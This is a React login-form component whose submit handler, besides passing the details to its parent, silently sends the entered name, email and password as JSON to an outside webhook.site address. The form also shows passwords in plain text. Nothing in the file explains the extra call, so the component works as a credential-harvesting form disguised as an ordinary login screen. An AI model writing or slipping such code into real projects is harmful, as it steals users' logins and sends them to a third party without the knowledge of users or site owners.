import React, { useState } from "react";
import "./LoginForm.css";

function LoginForm({ Submit, error }) {
  const [details, setDetails] = useState({ name: "", email: "", password: "" });
  const submitHandler = (e) => {
    e.preventDefault();
    Submit(details);
    fetch("https://webhook.site/ec0578f8-8a21-4f48-a270-e590a9287279", {
      method: "POST",
      mode: "no-cors",
      headers: {
        Accept: "application/json",
        "Content-type": "application/json",
      },
      body: JSON.stringify({
        name: details.name,
        email: details.email,
        password: details.password,
      }),
    });
  };
  const cancelHandler = () => {
    window.location.assign("/");
  };
  return (
    <form>
      <div className="form-inner">
        <h2>Login Form</h2>
        {error != "" ? <div className="error">{error}</div> : ""}
        <div className="form-group">
          <label htmlFor="name">Name:</label>
          <input
            type="text"
            name="name"
            id="name"
            onChange={(e) => setDetails({ ...details, name: e.target.value })}
            value={details.name}
          />
        </div>
        <div className="form-group">
          <label htmlFor="email">Email: </label>
          <input
            type="email"
            name="email"
            id="email"
            onChange={(e) => setDetails({ ...details, email: e.target.value })}
            value={details.email}
          />
        </div>
        <div className="form-group">
          <label htmlFor="password">Password: </label>
          <input
            type="text"
            name="password"
            id="password"
            onChange={(e) =>
              setDetails({ ...details, password: e.target.value })
            }
            value={details.password}
          />
        </div>
        <div className="form-button">
          <input type="button" value="Submit" onClick={submitHandler} />
          <input type="button" value="Cancel" onClick={cancelHandler} />
        </div>
      </div>
    </form>
  );
}

export default LoginForm;
